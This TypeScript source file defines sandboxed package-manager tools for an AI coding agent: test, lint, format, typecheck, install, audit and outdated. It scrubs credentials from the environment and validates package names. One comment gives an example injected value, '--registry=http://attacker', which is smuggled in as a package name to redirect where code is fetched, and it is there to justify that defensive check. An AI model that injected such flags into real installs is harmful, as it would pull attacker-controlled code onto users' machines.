import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import type { Tool, ToolContext, ToolResult } from "@arterm/core";
import { scrubEnv, withheldNote } from "@arterm/core";
import { shJoin } from "./shellQuote.js";

type Pm = "pnpm" | "yarn" | "npm";

interface ProjectScripts {
  pm: Pm;
  scripts: Record<string, string>;
  hasBiome: boolean;
  hasTsconfig: boolean;
}

/** Detect the package manager and available scripts from the working directory. */
export function detectScripts(cwd: string): ProjectScripts {
  let pm: Pm = "npm";
  if (existsSync(join(cwd, "pnpm-lock.yaml"))) pm = "pnpm";
  else if (existsSync(join(cwd, "yarn.lock"))) pm = "yarn";

  let scripts: Record<string, string> = {};
  try {
    const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8")) as {
      scripts?: Record<string, string>;
    };
    scripts = pkg.scripts ?? {};
  } catch {
    scripts = {};
  }
  const hasBiome = existsSync(join(cwd, "biome.json")) || existsSync(join(cwd, "biome.jsonc"));
  const hasTsconfig = existsSync(join(cwd, "tsconfig.json"));
  return { pm, scripts, hasBiome, hasTsconfig };
}

/** True when the working directory has a package.json at all. */
function hasManifest(cwd: string): boolean {
  return existsSync(join(cwd, "package.json"));
}

/** True when package.json declares the named script. */
function hasScript(cwd: string, name: string): boolean {
  return detectScripts(cwd).scripts[name] !== undefined;
}

interface RunOptions {
  /**
   * True when a non-zero exit is a FINDING rather than a failure. `npm audit`
   * exits 1 because it found vulnerabilities and `npm outdated` exits 1 because
   * something is outdated — reporting those as tool errors teaches the model
   * that the command is broken every time it does its job.
   */
  exitCodeIsData?: boolean;
}

/**
 * Run a command in the project.
 *
 * Everything the `bash` tool learned applies here and did not use to: the
 * command is confined by `ctx.sandbox` when a boundary is in force, and the
 * environment is scrubbed of credential-named variables in every mode. Before
 * this, `test`, `lint` and `format` spawned with the agent's own environment —
 * so a project's `test` script, and every dependency's postinstall, ran holding
 * the user's ANTHROPIC_API_KEY. `install` makes that concrete rather than
 * theoretical: fetching a package is asking a stranger's code to run here.
 *
 * `extendEnv: false` is the load-bearing half, for the reason `bash.ts` states:
 * execa MERGES `env` into `process.env` by default, so a scrubbed map alone
 * would have handed the originals over anyway.
 */
async function runProjectCommand(
  file: string,
  args: string[],
  ctx: ToolContext,
  opts: RunOptions = {},
): Promise<ToolResult> {
  const argv = [file, ...args];

  // The boundary is entered ARGV-form, never through `shell: true`: the wrapper
  // does its own quoting and a second shell pass would undo it. `shJoin` exists
  // only because the wrapper's entry point takes a command string.
  let sandboxed: { argv: string[]; env: Record<string, string | undefined> } | undefined;
  if (ctx.sandbox) {
    try {
      sandboxed = await ctx.sandbox.wrap(shJoin(argv), ctx.cwd, ctx.signal);
    } catch (err) {
      return { output: `Sandbox refused the command: ${why(err)}`, isError: true };
    }
  }

  const { env, withheld } = scrubEnv(
    { ...process.env, ...(sandboxed?.env ?? {}) },
    ctx.credentials,
  );

  try {
    // Lazy: execa is loaded on first project-command use, not at startup.
    const { execa } = await import("execa");
    const spawn = sandboxed?.argv ?? argv;
    const result = await execa(spawn[0] as string, spawn.slice(1), {
      cwd: ctx.cwd,
      shell: false,
      reject: false,
      all: true,
      env,
      extendEnv: false,
      ...(ctx.signal ? { cancelSignal: ctx.signal } : {}),
    });
    // No truncation here on purpose. Each tool declares `maxOutputBytes` and the
    // agent clamps centrally, keeping the HEAD AND TAIL — this used to cut at
    // 16 KB from the start, which for a test run throws away the failures and
    // keeps the banner.
    const out = (result.all ?? `${result.stdout}\n${result.stderr}`).trim();
    const failed = result.exitCode !== 0;
    if (!failed) return { output: out || "(no output)" };
    if (opts.exitCodeIsData && out !== "") {
      return { output: `${out}\n[exit code ${result.exitCode}]` };
    }
    const note = withheldNote(withheld, `${argv.join(" ")}\n${out}`);
    const tail = `\n[exit code ${result.exitCode}]${note ? `\n${note}` : ""}`;
    return { output: `${out}${tail}`.trim(), isError: true };
  } catch (err) {
    return { output: `Command failed: ${why(err)}`, isError: true };
  } finally {
    // Per-command sandbox state (masked credential files, proxy leases) is
    // released even when the command threw.
    ctx.sandbox?.release();
  }
}

function why(err: unknown): string {
  return err instanceof Error ? err.message : String(err);
}

/** `pnpm run <script>` / `npm run <script>` argument prefix for the detected PM. */
function runScript(pm: Pm, script: string, extra: string[]): string[] {
  // pnpm/yarn/npm all accept `run <script>`; npm needs `--` before script args.
  if (extra.length === 0) return ["run", script];
  return pm === "npm" ? ["run", script, "--", ...extra] : ["run", script, ...extra];
}

export const testTool: Tool = {
  name: "test",
  available: (cwd) => hasScript(cwd, "test"),
  maxOutputBytes: 65_536,
  description:
    "Run the project's test suite (auto-detected from package.json). Optionally pass a " +
    "name `filter` or a `path` to narrow the run.",
  permission: "allow",
  category: "execute",
  riskTier: "caution",
  parameters: {
    type: "object",
    properties: {
      filter: { type: "string", description: "Test name pattern to pass through to the runner." },
      path: { type: "string", description: "Test file or directory to run." },
    },
  },
  preview: () => "run project tests",
  async execute(args, ctx) {
    const { pm, scripts } = detectScripts(ctx.cwd);
    if (!scripts.test) {
      return { output: "No `test` script found in package.json.", isError: true };
    }
    const extra: string[] = [];
    if (typeof args.path === "string" && args.path.trim()) extra.push(args.path.trim());
    if (typeof args.filter === "string" && args.filter.trim()) {
      extra.push("-t", args.filter.trim());
    }
    return runProjectCommand(pm, runScript(pm, "test", extra), ctx);
  },
};

export const lintTool: Tool = {
  name: "lint",
  available: (cwd) => hasScript(cwd, "lint") || detectScripts(cwd).hasBiome,
  maxOutputBytes: 65_536,
  description:
    "Run the project's linter/check (read-only — never applies fixes). Auto-detects a " +
    "`lint` script or Biome.",
  permission: "allow",
  category: "read",
  riskTier: "safe",
  parameters: { type: "object", properties: {} },
  preview: () => "run project lint",
  async execute(_args, ctx) {
    const { pm, scripts, hasBiome } = detectScripts(ctx.cwd);
    if (scripts.lint) return runProjectCommand(pm, runScript(pm, "lint", []), ctx);
    if (hasBiome) return runProjectCommand(pm, ["exec", "biome", "check", "."], ctx);
    return { output: "No `lint` script or Biome config found.", isError: true };
  },
};

export const formatTool: Tool = {
  name: "format",
  available: (cwd) => hasScript(cwd, "format") || detectScripts(cwd).hasBiome,
  maxOutputBytes: 16_384,
  description:
    "Format the project's source in place (writes files). Auto-detects a `format` script " +
    "or Biome.",
  permission: "ask",
  category: "edit",
  mutating: true,
  riskTier: "caution",
  parameters: { type: "object", properties: {} },
  preview: () => "format project source (writes files)",
  async execute(_args, ctx) {
    const { pm, scripts, hasBiome } = detectScripts(ctx.cwd);
    if (scripts.format) return runProjectCommand(pm, runScript(pm, "format", []), ctx);
    if (hasBiome) return runProjectCommand(pm, ["exec", "biome", "format", "--write", "."], ctx);
    return { output: "No `format` script or Biome config found.", isError: true };
  },
};

export const typecheckTool: Tool = {
  name: "typecheck",
  available: (cwd) => hasScript(cwd, "typecheck") || detectScripts(cwd).hasTsconfig,
  maxOutputBytes: 65_536,
  description:
    "Type-check the project without emitting output. Auto-detects a `typecheck` script " +
    "or falls back to `tsc --noEmit`.",
  usageHint:
    "This is the cheapest check that a change is coherent across files — the one thing `lint` " +
    "and `test` between them do not tell you, because a type error in a file no test imports " +
    "still breaks the build. Run it after editing any signature, not only before finishing.",
  permission: "allow",
  category: "read",
  riskTier: "safe",
  parameters: { type: "object", properties: {} },
  preview: () => "type-check the project",
  async execute(_args, ctx) {
    const { pm, scripts, hasTsconfig } = detectScripts(ctx.cwd);
    // The script wins when there is one: in a monorepo it is what knows to run
    // every package (`pnpm -r typecheck`), which a bare `tsc` in the root cannot.
    if (scripts.typecheck) return runProjectCommand(pm, runScript(pm, "typecheck", []), ctx);
    if (scripts["type-check"]) return runProjectCommand(pm, runScript(pm, "type-check", []), ctx);
    if (hasTsconfig) return runProjectCommand(pm, ["exec", "tsc", "--noEmit"], ctx);
    return {
      output: "No `typecheck` script and no tsconfig.json — nothing to type-check.",
      isError: true,
    };
  },
};

/**
 * Anything that would be read as a FLAG rather than a package name.
 *
 * `install({packages: ["--registry=http://attacker"]})` is the whole reason:
 * argv reaches the package manager positionally, so a leading dash turns a
 * "package name" into an option that repoints where the code comes from. A
 * package name never starts with `-`, so refusing is free.
 */
function badPackageName(name: string): string | undefined {
  if (name.trim() === "") return "empty";
  if (name.startsWith("-")) return "starts with '-', which the package manager reads as a flag";
  if (/\s/.test(name)) return "contains whitespace";
  return undefined;
}

export const installTool: Tool = {
  name: "install",
  available: hasManifest,
  maxOutputBytes: 32_768,
  description:
    "Install the project's dependencies, or add named `packages`. Uses the detected " +
    "package manager.",
  usageHint:
    "Call it with no `packages` to restore what the lockfile already names — that is the safe, " +
    "deterministic case and what CI does. Naming packages fetches and RUNS code that was not in " +
    "the project before, which is why it asks first. Add `frozen: true` when you only want to " +
    "know whether the lockfile is up to date: it fails instead of quietly rewriting it.",
  permission: "ask",
  category: "execute",
  mutating: true,
  // Adding a dependency executes install scripts from a package the user never
  // named. That is a bigger step than any edit, and it is worth a prompt even
  // in auto mode — the sandbox's egress allowlist bounds where it can reach,
  // not what it can do with the machine.
  riskTier: "destructive",
  parameters: {
    type: "object",
    properties: {
      packages: {
        type: "array",
        items: { type: "string" },
        description: "Packages to add; omit to install what the lockfile names.",
      },
      dev: { type: "boolean", description: "Add as devDependencies." },
      frozen: { type: "boolean", description: "Fail rather than update the lockfile." },
    },
  },
  preview: (args) => {
    const pkgs = Array.isArray(args.packages) ? args.packages.map(String) : [];
    if (pkgs.length === 0) return "install project dependencies";
    return `install ${args.dev === true ? "(dev) " : ""}${pkgs.join(" ")}`;
  },
  async execute(args, ctx) {
    const { pm } = detectScripts(ctx.cwd);
    const packages = Array.isArray(args.packages) ? args.packages.map(String) : [];
    for (const name of packages) {
      const bad = badPackageName(name);
      if (bad) return { output: `Refused package name "${name}": ${bad}.`, isError: true };
    }

    if (packages.length === 0) {
      const frozen = args.frozen === true;
      if (pm === "pnpm")
        return runProjectCommand(pm, frozen ? ["install", "--frozen-lockfile"] : ["install"], ctx);
      if (pm === "yarn")
        return runProjectCommand(pm, frozen ? ["install", "--immutable"] : ["install"], ctx);
      return runProjectCommand(pm, [frozen ? "ci" : "install"], ctx);
    }

    const dev = args.dev === true;
    // `--` before the names so a package called `-foo` could never be read as a
    // flag even if the check above were to change; belt and braces on argv.
    if (pm === "npm") {
      return runProjectCommand(
        pm,
        ["install", ...(dev ? ["--save-dev"] : []), "--", ...packages],
        ctx,
      );
    }
    return runProjectCommand(pm, ["add", ...(dev ? ["-D"] : []), "--", ...packages], ctx);
  },
};

export const auditTool: Tool = {
  name: "audit",
  available: hasManifest,
  maxOutputBytes: 32_768,
  description: "Report known vulnerabilities in the project's dependencies.",
  permission: "allow",
  category: "read",
  riskTier: "safe",
  parameters: { type: "object", properties: {} },
  preview: () => "audit dependencies for known vulnerabilities",
  async execute(_args, ctx) {
    const { pm } = detectScripts(ctx.cwd);
    // Finding vulnerabilities is what a successful audit looks like, and the
    // package managers all signal it with a non-zero exit.
    return runProjectCommand(pm, ["audit"], ctx, { exitCodeIsData: true });
  },
};

export const outdatedTool: Tool = {
  name: "outdated",
  available: hasManifest,
  maxOutputBytes: 16_384,
  description: "List dependencies with a newer version available.",
  permission: "allow",
  category: "read",
  riskTier: "safe",
  parameters: { type: "object", properties: {} },
  preview: () => "list outdated dependencies",
  async execute(_args, ctx) {
    const { pm } = detectScripts(ctx.cwd);
    // Same as audit: `npm outdated` exits 1 precisely when it has something to say.
    return runProjectCommand(pm, ["outdated"], ctx, { exitCodeIsData: true });
  },
};

/** Shared by `logs`, which runs a command the same way but is not a package-manager tool. */
export { runProjectCommand };
